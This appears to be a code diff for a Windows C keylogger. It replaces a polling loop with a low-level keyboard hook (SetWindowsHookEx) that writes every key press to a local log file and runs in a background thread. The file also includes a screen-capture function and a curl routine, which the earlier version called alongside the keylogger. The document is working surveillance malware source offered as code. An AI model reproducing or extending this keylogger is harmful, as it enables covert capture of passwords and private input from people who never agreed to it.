@@ -2,9 +2,6 @@
 #include <time.h>
 #include "curl/curl.h"
 
-unsigned int buffer[1024];
-unsigned int ptr;
-
 void ScreenCapture(int width, int height)
 {
 	HDC hDc = CreateCompatibleDC(0);
@@ -52,80 +49,65 @@ int curl()
 
 
 
-			
-void saveLog()
+DWORD WINAPI ThreadFunc(void *data)
+{
+}
+
+void saveKey(unsigned int keyCode)
 {
 	FILE *log;
 	unsigned int p;
 	
 	log = fopen("log", "a+");
-	for (p = 0; p < ptr; p++)
-	{
-		fprintf(log, "%02X,", buffer[p]);
-	}
-	
+	fprintf(log, "%d,", keyCode);
 	fclose(log);
 }
 
-DWORD WINAPI ThreadFunc(void *data)
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
-	saveLog();
+    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *) lParam;
+    
+    if (wParam == WM_KEYDOWN)
+    {
+    	DWORD key = pKeyBoard->vkCode;
+        saveKey(key);
+    }
+    return 0;
 }
 
-void saveKey(unsigned int keyCode)
+DWORD WINAPI KeyLogger()
 {
-	buffer[ptr++] = keyCode;
+    HHOOK hKeyHook;
+    HINSTANCE hExe = GetModuleHandle(NULL);
+    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC) LowLevelKeyboardProc, hExe, 0);
+    RegisterHotKey(NULL, 1, MOD_ALT | MOD_CONTROL, 0x39);
+    MSG msg;
+
+    while (GetMessage(&msg, NULL, 0, 0) != 0)
+    {
+        if (msg.message == WM_HOTKEY)
+        {
+            UnhookWindowsHookEx(hKeyHook);
+            return 0;
+        }
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    UnhookWindowsHookEx(hKeyHook);
+
+    return 0;
 }
 
-void keyloggerLoop()
-{
-	unsigned int currKeyStatus[256];
-	unsigned int prevKeyStatus[256];
-	unsigned int prevKey, currKey;
-	unsigned int k;
-	ptr = 0;
-
-	for (k = 0; k < 256; k++)
-	{
-		currKeyStatus[k] = 0;
-	}
-			
-	while(1)
-	{
-		for (k = 0; k < 256; k++)
-		{
-			prevKeyStatus[k] = currKeyStatus[k];
-		}
-
-		for (k = 0; k < 256; k++)
-		{			
-			currKeyStatus[k] = GetAsyncKeyState(k);		
-		}
-		
-		for (k = 0; k < 256; k++)
-		{
-			if(currKeyStatus[k])
-			{
-				saveKey(k);
-			}
-		}
-	
-		if(ptr > 20)
-		{
-			saveLog();
-			ptr = 0;
-		}
-		
-		//HANDLE thread = CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);
-		
-		usleep(1000);
-	}
-}
 
 int main(void)
 {
-	ScreenCapture(800, 600);
-	curl();
-	keyloggerLoop();
+	HANDLE logger;
+    logger = CreateThread(NULL, 0, KeyLogger, NULL, 0, NULL);
+
+	while(1)
+	{
+		sleep(50);
+	}
+	
 	return 0;
 }
